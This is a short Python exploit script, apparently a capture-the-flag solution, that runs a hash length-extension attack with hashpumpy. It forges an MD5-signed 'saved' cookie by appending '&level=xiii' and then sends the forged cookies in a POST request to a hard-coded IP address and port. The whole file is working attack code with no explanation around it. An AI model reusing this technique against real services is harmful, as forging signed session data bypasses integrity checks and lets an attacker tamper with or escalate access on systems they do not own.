import hashpumpy
import requests
import base64
# saved: seed=huhu&level=xiii => seed: huhu&level=xiii e530da3436a296a64c95851ba57e22b3
for key_length in range(16,17):
	print(key_length)
	saved,msg = hashpumpy.hashpump("e530da3436a296a64c95851ba57e22b3", "huhu", "&level=xiii", key_length)
	cookies = {"hash":saved,"saved":base64.b64encode(b"seed="+msg).decode("utf-8")}
	response = requests.post("http://45.76.148.31:9004/",cookies=cookies,data={"level13_choice":"yes"})
	print(response.text)
